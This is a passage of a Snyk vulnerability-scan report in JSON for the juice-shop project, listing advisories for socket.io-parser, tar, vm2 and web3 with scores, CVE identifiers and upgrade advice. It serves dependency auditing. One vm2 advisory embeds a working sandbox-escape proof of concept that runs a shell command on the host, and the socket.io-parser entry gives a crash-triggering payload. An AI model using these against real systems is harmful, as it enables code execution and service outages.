          "description": "## Overview\n[socket.io-parser](https://www.npmjs.org/package/socket.io-parser) is a socket.io protocol parser\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to insufficient validation when decoding a packet. An attacker can send an event with a name like `'2[{\"toString\":\"foo\"}]'` to trigger an uncaught exception and a crash, like the below.\r\n\r\n```\r\nTypeError: Cannot convert object to primitive value\r\n       at Socket.emit (node:events:507:25)\r\n       at .../node_modules/socket.io/lib/socket.js:531:14\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `socket.io-parser` to version 3.4.3, 4.2.3 or higher.\n## References\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced)\n- [GitHub Commit](https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3)\n- [GitHub Release](https://github.com/socketio/socket.io-parser/releases/tag/3.4.3)\n",
          "epssDetails": {
            "percentile": "0.37918",
            "probability": "0.00162",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2023-32695"
            ],
            "CWE": [
              "CWE-400"
            ],
            "GHSA": [
              "GHSA-cqmj-92xf-r6r9"
            ]
          },
          "packageName": "socket.io-parser",
          "proprietary": false,
          "creationTime": "2023-05-24T07:36:34.088298Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2023-05-23T19:55:13Z",
          "exploitDetails": {
            "sources": [],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Not Defined",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Not Defined",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2023-05-24T07:39:19.358296Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:53:18.116269Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "socket.io@3.1.2",
            "socket.io-parser@4.0.5"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "socket.io-parser",
          "version": "4.0.5",
          "severityWithCritical": "high"
        },
        {
          "id": "SNYK-JS-TAR-6476909",
          "title": "Uncontrolled Resource Consumption ('Resource Exhaustion')",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H/E:P",
          "credit": [
            "Mohamed Dief"
          ],
          "semver": {
            "vulnerable": [
              "<6.2.1"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [
            "6.2.1"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 6.5,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "tar",
          "references": [
            {
              "url": "https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7",
              "title": "GitHub Commit"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "Red Hat",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
              "cvssV3BaseScore": 6.5,
              "modificationTime": "2024-06-20T13:34:25.566902Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 6.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-29T11:51:08.899351Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
              "assigner": "Red Hat",
              "severity": "medium",
              "baseScore": 6.5,
              "cvssVersion": "3.1",
              "modificationTime": "2024-06-20T13:34:25.566902Z"
            }
          ],
          "description": "## Overview\n[tar](https://www.npmjs.com/package/tar) is a full-featured Tar for Node.js.\n\nAffected versions of this package are vulnerable to Uncontrolled Resource Consumption ('Resource Exhaustion') due to the lack of folders count validation during the folder creation process. An attacker who generates a large number of sub-folders can consume memory on the system running the software and even crash the client within few seconds of running it using a path with too many sub-folders inside.\n## Remediation\nUpgrade `tar` to version 6.2.1 or higher.\n## References\n- [GitHub Commit](https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7)\n",
          "epssDetails": {
            "percentile": "0.42247",
            "probability": "0.00198",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-28863"
            ],
            "CWE": [
              "CWE-400"
            ],
            "GHSA": [
              "GHSA-f5x3-32g6-xq36"
            ]
          },
          "packageName": "tar",
          "proprietary": false,
          "creationTime": "2024-03-22T12:56:33.802918Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-03-21T22:40:19Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-03-22T12:56:33.985087Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-06-20T13:34:25.566902Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "node-pre-gyp@0.15.0",
            "tar@4.4.19"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "tar",
          "version": "4.4.19",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-VM2-5537079",
          "title": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P",
          "credit": [
            "Takeshi Kaneko"
          ],
          "semver": {
            "vulnerable": [
              "<3.9.18"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [
            "3.9.18"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 5.3,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "vm2",
          "references": [
            {
              "url": "https://github.com/patriksimek/vm2/commit/5206ba25afd86ef547a2c9d48d46ca7a9e6ec238",
              "title": "GitHub Commit"
            },
            {
              "url": "https://github.com/patriksimek/vm2/releases/tag/3.9.18",
              "title": "GitHub Release"
            },
            {
              "url": "https://gist.github.com/arkark/c1c57eaf3e0a649af1a70c2b93b17550",
              "title": "PoC"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "medium",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "cvssV3BaseScore": 5.3,
              "modificationTime": "2024-03-11T09:53:15.875083Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T13:56:59.541484Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
              "assigner": "NVD",
              "severity": "medium",
              "baseScore": 5.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:15.875083Z"
            }
          ],
          "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') via the `inspect` method of `vm.js`, which allows `write` permissions. \r\nExploiting this vulnerability allows an attacker to edit options for the `console.log` command.\r\n\r\n## Workaround\r\nUsers unable to upgrade may make the `inspect` method `readonly` with `vm.readonly(inspect)` after creating a VM.\n## Remediation\nUpgrade `vm2` to version 3.9.18 or higher.\n## References\n- [GitHub Commit](https://github.com/patriksimek/vm2/commit/5206ba25afd86ef547a2c9d48d46ca7a9e6ec238)\n- [GitHub Release](https://github.com/patriksimek/vm2/releases/tag/3.9.18)\n- [PoC](https://gist.github.com/arkark/c1c57eaf3e0a649af1a70c2b93b17550)\n",
          "epssDetails": {
            "percentile": "0.70145",
            "probability": "0.00653",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2023-32313"
            ],
            "CWE": [
              "CWE-74"
            ],
            "GHSA": [
              "GHSA-p5gc-c584-jj6v"
            ]
          },
          "packageName": "vm2",
          "proprietary": false,
          "creationTime": "2023-05-16T08:07:30.028918Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2023-05-16T07:52:13Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2023-05-16T08:18:20.099998Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:53:15.875083Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "juicy-chat-bot@0.9.0",
            "vm2@3.9.17"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "vm2",
          "version": "3.9.17",
          "severityWithCritical": "medium"
        },
        {
          "id": "SNYK-JS-VM2-5537100",
          "title": "Sandbox Bypass",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
          "credit": [
            "Takeshi Kaneko"
          ],
          "semver": {
            "vulnerable": [
              "<3.9.18"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [
            "3.9.18"
          ],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "critical",
          "cvssScore": 9.8,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "vm2",
          "references": [
            {
              "url": "https://github.com/patriksimek/vm2/commit/d88105f99752305c5b8a77b63ddee3ec86912daf",
              "title": "GitHub Commit"
            },
            {
              "url": "https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac",
              "title": "GitHub Gist"
            },
            {
              "url": "https://github.com/patriksimek/vm2/releases/tag/3.9.18",
              "title": "GitHub Release"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "critical",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
              "cvssV3BaseScore": 10,
              "modificationTime": "2024-03-11T09:53:15.879124Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
              "assigner": "Snyk",
              "severity": "critical",
              "baseScore": 9.8,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T13:57:06.387100Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
              "assigner": "NVD",
              "severity": "critical",
              "baseScore": 10,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:15.879124Z"
            }
          ],
          "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Sandbox Bypass by abusing an unexpected creation of a host object based on the maliciously crafted specification of `Proxy`.\r\nExploiting this vulnerability allows an attacker to gain remote code execution rights on the host running the sandbox via the `Function` constructor.\n## PoC\n```js\r\nconst { VM } = require(\"vm2\");\r\nconst vm = new VM();\r\n\r\nconst code = `\r\n  const err = new Error();\r\n  err.name = {\r\n    toString: new Proxy(() => \"\", {\r\n      apply(target, thiz, args) {\r\n        const process = args.constructor.constructor(\"return process\")();\r\n        throw process.mainModule.require(\"child_process\").execSync(\"echo hacked\").toString();\r\n      },\r\n    }),\r\n  };\r\n  try {\r\n    err.stack;\r\n  } catch (stdout) {\r\n    stdout;\r\n  }\r\n`;\r\n\r\nconsole.log(vm.run(code)); // -> hacked\r\n```\n## Remediation\nUpgrade `vm2` to version 3.9.18 or higher.\n## References\n- [GitHub Commit](https://github.com/patriksimek/vm2/commit/d88105f99752305c5b8a77b63ddee3ec86912daf)\n- [GitHub Gist](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)\n- [GitHub Release](https://github.com/patriksimek/vm2/releases/tag/3.9.18)\n",
          "epssDetails": {
            "percentile": "0.98616",
            "probability": "0.69492",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2023-32314"
            ],
            "CWE": [
              "CWE-265"
            ],
            "GHSA": [
              "GHSA-whpj-8f3w-67p5"
            ]
          },
          "packageName": "vm2",
          "proprietary": false,
          "creationTime": "2023-05-16T08:35:19.310061Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2023-05-15T20:50:51Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2023-05-16T10:07:04.650908Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:53:15.879124Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "juicy-chat-bot@0.9.0",
            "vm2@3.9.17"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "vm2",
          "version": "3.9.17",
          "severityWithCritical": "critical"
        },
        {
          "id": "SNYK-JS-VM2-5772823",
          "title": "Remote Code Execution (RCE)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
          "credit": [
            "SeungHyun Lee"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "critical",
          "cvssScore": 9.8,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "vm2",
          "references": [
            {
              "url": "https://github.com/patriksimek/vm2/issues/533",
              "title": "GitHub Issue"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "critical",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
              "cvssV3BaseScore": 10,
              "modificationTime": "2024-03-11T09:53:27.824223Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
              "assigner": "Snyk",
              "severity": "critical",
              "baseScore": 9.8,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T14:09:14.671716Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
              "assigner": "NVD",
              "severity": "critical",
              "baseScore": 10,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:27.824223Z"
            }
          ],
          "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) due to insufficient checks which allow an attacker to escape the sandbox.\r\n\r\n**Note:**\r\n\r\nAccording to the maintainer, the security issue cannot be properly addressed and the library will be discontinued.\n## Remediation\nThere is no fixed version for `vm2`.\n## References\n- [GitHub Issue](https://github.com/patriksimek/vm2/issues/533)\n",
          "epssDetails": {
            "percentile": "0.96914",
            "probability": "0.35568",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2023-37903"
            ],
            "CWE": [
              "CWE-94"
            ]
          },
          "packageName": "vm2",
          "proprietary": false,
          "creationTime": "2023-07-12T14:23:22.486382Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2023-07-12T14:10:56Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2023-07-12T14:50:43.988574Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-03-11T09:53:27.824223Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "juicy-chat-bot@0.9.0",
            "vm2@3.9.17"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "vm2",
          "version": "3.9.17",
          "severityWithCritical": "critical"
        },
        {
          "id": "SNYK-JS-VM2-5772825",
          "title": "Remote Code Execution (RCE)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
          "credit": [
            "SeungHyun Lee"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Functional",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "critical",
          "cvssScore": 9.8,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "vm2",
          "references": [
            {
              "url": "https://github.com/patriksimek/vm2/issues/533",
              "title": "GitHub Issue"
            },
            {
              "url": "https://www.exploit-db.com/exploits/51898",
              "title": "Exploit DB"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "critical",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
              "cvssV3BaseScore": 10,
              "modificationTime": "2024-03-11T09:53:27.053027Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
              "assigner": "Snyk",
              "severity": "critical",
              "baseScore": 9.8,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T14:09:53.667607Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
              "assigner": "NVD",
              "severity": "critical",
              "baseScore": 10,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:53:27.053027Z"
            }
          ],
          "description": "## Overview\n[vm2](https://github.com/patriksimek/vm2#readme) is a sandbox that can run untrusted code with whitelisted Node's built-in modules.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) such that the `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox. \r\n\r\n**Note:**\r\n\r\nAccording to the maintainer, the security issue cannot be properly addressed and the library will be discontinued.\n## Remediation\nThere is no fixed version for `vm2`.\n## References\n- [GitHub Issue](https://github.com/patriksimek/vm2/issues/533)\n- [Exploit DB](https://www.exploit-db.com/exploits/51898)\n",
          "epssDetails": {
            "percentile": "0.88994",
            "probability": "0.04732",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2023-37466"
            ],
            "CWE": [
              "CWE-94"
            ],
            "GHSA": [
              "GHSA-4g2x-vq5p-5vj6",
              "GHSA-cchq-frgv-rjh5"
            ]
          },
          "packageName": "vm2",
          "proprietary": false,
          "creationTime": "2023-07-12T14:23:33.336819Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2023-07-12T14:20:17Z",
          "exploitDetails": {
            "sources": [
              "ExploitDB",
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Functional",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2023-07-12T14:50:28.303109Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-06-03T08:53:02.295934Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "juice-shop@19.0.0",
            "juicy-chat-bot@0.9.0",
            "vm2@3.9.17"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "vm2",
          "version": "3.9.17",
          "severityWithCritical": "critical"
        },
        {
          "id": "SNYK-JS-WEB3-174533",
          "title": "Insecure Credential Storage",
          "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
          "credit": [
            "sshelton76"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Not Defined",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "low",
          "cvssScore": 3.3,
          "functions": [],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "web3",
          "references": [
            {
              "url": "https://github.com/ethereum/web3.js/issues/2739",
              "title": "GitHub Issue"
            },
            {
              "url": "https://github.com/web3/web3.js/issues/6913",
              "title": "GitHub Issue"
            }
          ],
          "cvssDetails": [],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
              "assigner": "Snyk",
              "severity": "low",
              "baseScore": 3.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-11-07T13:05:02.752265Z"
            }
          ],
          "description": "## Overview\n[web3](https://www.npmjs.com/package/web3) is a JavaScript API which connects to the Generic JSON RPC spec.\n\nAffected versions of this package are vulnerable to Insecure Credential Storage. The current implementation of web3.js could result in wallet decryption under certain circumstances. When a wallet is saved and encrypted into local storage, a private key is needed to load the wallet. However, this private key is available via LocalStorage and is readable in plaintext on a webpage after a wallet is loaded. \r\n\r\nThis implementation could be abused by an attacker through client-side attacks such as Cross-site Scripting (XSS) and could result in theft of a user's wallet private key.\n## Remediation\nThere is no fixed version for `web3`.\n## References\n- [GitHub Issue](https://github.com/ethereum/web3.js/issues/2739)\n- [GitHub Issue](https://github.com/web3/web3.js/issues/6913)\n",
          "epssDetails": null,
          "identifiers": {
            "CVE": [],
            "CWE": [
              "CWE-256"
            ],
            "NSP": [
              "877"
            ],
            "GHSA": [
              "GHSA-27v7-qhfv-rqq8"
            ]
          },
          "packageName": "web3",
          "proprietary": false,
          "creationTime": "2019-04-28T10:16:40.300717Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2019-04-26T08:48:18Z",
          "exploitDetails": {
            "sources": [],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Not Defined",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Not Defined",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2019-04-28T12:03:31Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2024-11-07T13:05:02.752265Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 98,
          "from": [
            "juice-shop@19.0.0",
            "web3@4.16.0"
          ],
          "upgradePath": [],
          "isUpgradable": false,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "web3",
          "version": "4.16.0",
          "severityWithCritical": "low"
        }
      ],
      "upgrade": {
        "check-dependencies@1.1.1": {
          "upgradeTo": "check-dependencies@2.0.0",
          "upgrades": [
            "braces@2.3.2",
            "micromatch@3.1.10",
            "unset-value@1.0.0"
          ],
          "vulns": [
            "SNYK-JS-BRACES-6838727",
            "SNYK-JS-MICROMATCH-6838728",
            "SNYK-JS-UNSETVALUE-2400660"
          ]
        },
        "express-jwt@0.1.3": {
          "upgradeTo": "express-jwt@7.7.8",
          "upgrades": [
            "jsonwebtoken@0.1.0",
            "jsonwebtoken@0.1.0",
            "jsonwebtoken@0.1.0",
            "express-jwt@0.1.3",
            "jsonwebtoken@0.1.0",
            "moment@2.0.0",
            "moment@2.0.0",
            "moment@2.0.0",
            "moment@2.0.0",
            "base64url@0.0.6",
            "jws@0.2.6"
          ],
          "vulns": [
            "SNYK-JS-JSONWEBTOKEN-3180022",
            "SNYK-JS-JSONWEBTOKEN-3180024",
            "SNYK-JS-JSONWEBTOKEN-3180026",
            "SNYK-JS-EXPRESSJWT-575022",
            "npm:jsonwebtoken:20150331",
            "SNYK-JS-MOMENT-2440688",
            "npm:moment:20160126",
            "npm:moment:20161019",
            "npm:moment:20170905",
            "npm:base64url:20180511",
            "npm:jws:20160726"
          ]
        },
        "i18n@0.11.1": {
          "upgradeTo": "i18n@0.14.0",
          "upgrades": [
            "messageformat@2.3.0"
          ],
          "vulns": [
            "SNYK-JS-MESSAGEFORMAT-13109646"
          ]
        },
        "jsonwebtoken@0.4.0": {
          "upgradeTo": "jsonwebtoken@9.0.0",
          "upgrades": [
            "jsonwebtoken@0.4.0",
            "jsonwebtoken@0.4.0",
            "jsonwebtoken@0.4.0",
            "jsonwebtoken@0.4.0",
            "base64url@0.0.6",
            "jws@0.2.6"
          ],
          "vulns": [
            "SNYK-JS-JSONWEBTOKEN-3180022",
            "SNYK-JS-JSONWEBTOKEN-3180024",
            "SNYK-JS-JSONWEBTOKEN-3180026",
            "npm:jsonwebtoken:20150331",
            "npm:base64url:20180511",
            "npm:jws:20160726"
          ]
        },
        "multer@1.4.5-lts.2": {
          "upgradeTo": "multer@2.0.2",
          "upgrades": [
            "multer@1.4.5-lts.2",
            "multer@1.4.5-lts.2",
            "multer@1.4.5-lts.2",
            "multer@1.4.5-lts.2"
          ],
          "vulns": [
            "SNYK-JS-MULTER-10773732",
            "SNYK-JS-MULTER-10299078",
            "SNYK-JS-MULTER-10185673",
            "SNYK-JS-MULTER-10185675"
          ]
        },
        "pdfkit@0.11.0": {
          "upgradeTo": "pdfkit@0.12.2",
          "upgrades": [
            "crypto-js@3.3.0"
          ],
          "vulns": [
            "SNYK-JS-CRYPTOJS-6028119"
          ]
        },
        "sanitize-html@1.4.2": {
          "upgradeTo": "sanitize-html@2.12.1",
          "upgrades": [
            "sanitize-html@1.4.2",
            "sanitize-html@1.4.2",
            "sanitize-html@1.4.2",
            "sanitize-html@1.4.2",
            "sanitize-html@1.4.2",
            "sanitize-html@1.4.2",
            "lodash@2.4.2",
            "lodash@2.4.2",
            "lodash@2.4.2",
            "lodash@2.4.2",
            "lodash@2.4.2",
            "lodash@2.4.2",
            "lodash@2.4.2",
            "lodash@2.4.2",
            "sanitize-html@1.4.2",
            "sanitize-html@1.4.2"
          ],
          "vulns": [
            "SNYK-JS-SANITIZEHTML-6256334",
            "SNYK-JS-SANITIZEHTML-2957526",
            "SNYK-JS-SANITIZEHTML-1070780",
            "SNYK-JS-SANITIZEHTML-1070786",
            "SNYK-JS-SANITIZEHTML-585892",
            "npm:sanitize-html:20161026",
            "SNYK-JS-LODASH-1018905",
            "SNYK-JS-LODASH-1040724",
            "SNYK-JS-LODASH-450202",
            "SNYK-JS-LODASH-608086",
            "SNYK-JS-LODASH-6139239",
            "SNYK-JS-LODASH-73638",
            "SNYK-JS-LODASH-73639",
            "npm:lodash:20180130",
            "npm:sanitize-html:20141024",
            "npm:sanitize-html:20160801"
          ]
        },
        "socket.io@3.1.2": {
          "upgradeTo": "socket.io@4.8.0",
          "upgrades": [
            "cookie@0.4.2",
            "ws@7.4.6",
            "socket.io@3.1.2",
            "engine.io@4.1.2"
          ],
          "vulns": [
            "SNYK-JS-COOKIE-8163060",
            "SNYK-JS-WS-7266574",
            "SNYK-JS-SOCKETIO-7278048",
            "SNYK-JS-ENGINEIO-3136336"
          ]
        },
        "unzipper@0.9.15": {
          "upgradeTo": "unzipper@0.12.1",
          "upgrades": [
            "inflight@1.0.6"
          ],
          "vulns": [
            "SNYK-JS-INFLIGHT-6095116"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 61,
    "projectName": "juice-shop",
    "foundProjectCount": 2,
    "displayTargetFile": "package-lock.json",
    "hasUnknownVersions": false,
    "path": "/home/runner/work/report-samples/report-samples/juice-shop"
  },
  {
    "vulnerabilities": [
      {
        "id": "SNYK-JS-CODEMIRROR-10494092",
